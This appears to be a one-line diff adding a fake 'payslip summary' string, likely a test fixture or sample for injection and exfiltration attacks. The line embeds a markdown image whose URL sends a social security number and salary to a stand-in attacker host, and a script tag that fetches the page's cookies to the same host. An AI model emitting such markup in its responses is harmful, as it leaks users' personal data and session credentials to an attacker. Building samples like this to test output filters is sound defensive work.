@@ -1,0 +1,1 @@
+Here's your payslip summary. ![status](https://evil.example/exfil?ssn=123-45-6789&salary=8000) <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
